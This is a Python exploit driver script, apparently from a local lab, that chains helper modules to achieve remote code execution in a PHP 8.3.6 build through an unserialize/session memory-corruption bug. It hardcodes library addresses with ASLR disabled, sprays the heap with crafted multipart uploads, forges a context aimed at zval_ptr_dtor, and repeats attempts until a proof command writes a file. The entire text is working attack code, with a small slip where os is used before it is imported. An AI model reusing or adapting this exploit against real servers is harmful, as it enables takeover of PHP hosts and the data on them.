#!/usr/bin/env python3
"""RCE driver v2: php2shell_weapon internals with per-attempt fresh sids.

Fixes vs W.main() for the ASLR-off local lab:
  - CALL_DELTA = 0xD370 (this PHP 8.3.6 build; video intel 0xBE3F0 is theirs)
  - zval_ptr_dtor = 0x7ffff6906380 (ASLR off, libphp base 0x7ffff6600000)
  - every attempt uses a FRESH arm sid + fire sid, so the flock leaked by
    each arm bailout never deadlocks the next request (same child).
  - sweet-spot tuning: arm namelen 98304, spray 200, t[] 149.
"""
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P
import php2shell_weapon as W

W.CALL_DELTA = 0xD370
URL = "http://127.0.0.1:18120/index.php"
DTOR = 0x7ffff6906380          # zval_ptr_dtor, ASLR off
CMD = b"id > /tmp/php2shell_rce_proof.txt"
BND = b"UctxPoc2026"
ATTEMPTS = 12
ARM_FILES, NAMELEN, P1UNITS, SPRAY = 20, 98304, 390, 200

def sid(i):
    return ("u%032d" % i)[-32:] if False else ("at%029d" % i)

small = W.call_forge(CMD, DTOR)

for i in range(1, ATTEMPTS + 1):
    s_arm, s_fire = sid(i), sid(1000 + i)
    # ARM (fresh sid -> fresh flock inode)
    arm = P.arm_body(s_arm, BND, ARM_FILES, NAMELEN)
    st, d, dt = W.safe_send(URL, arm, BND, s_arm, 0.0, 0)
    oom = (st == 500) or (b"exhausted" in d) or (st is None)
    # P1
    p1 = P.fire1_body(s_arm, BND, P1UNITS * 11000)
    st1, d1, dt1 = W.safe_send(URL, p1, BND, s_arm, 0.0, 0)
    # CALL (fresh fire sid; forged ctx aimed at real dtor)
    ctx = P.forge_ctx(DTOR, DTOR, used=1018, data0=DTOR)
    body = P.fire_body(s_fire, BND, SPRAY, ctx, n_small=W.T_COUNT, t_small=small)
    st2, d2, dt2 = W.safe_send(URL, body, BND, s_fire, 0.0, 0)
    print("attempt %d/%d arm=%s(p1=%s) call=%s dt=%.2f  %s"
          % (i, ATTEMPTS, st, st1, st2, dt2,
             "EXEC-HIT uid=" if b"uid=" in d2 else (d2[:80] if d2 else "")), flush=True)
    if b"uid=" in d2 or b"LABOK" in d2 and b"uid=" in d2:
        break
    if st2 is None:
        print("  kill signature (no HTTP) - child wedged; stopping")
        break
    try:
        import os
        os.path.getsize("/tmp/php2shell_rce_proof.txt")
        print("  PROOF FILE EXISTS"); break
    except OSError:
        pass
    time.sleep(0.3)

try:
    print(open("/tmp/php2shell_rce_proof.txt").read())
except OSError:
    print("(no proof file)")
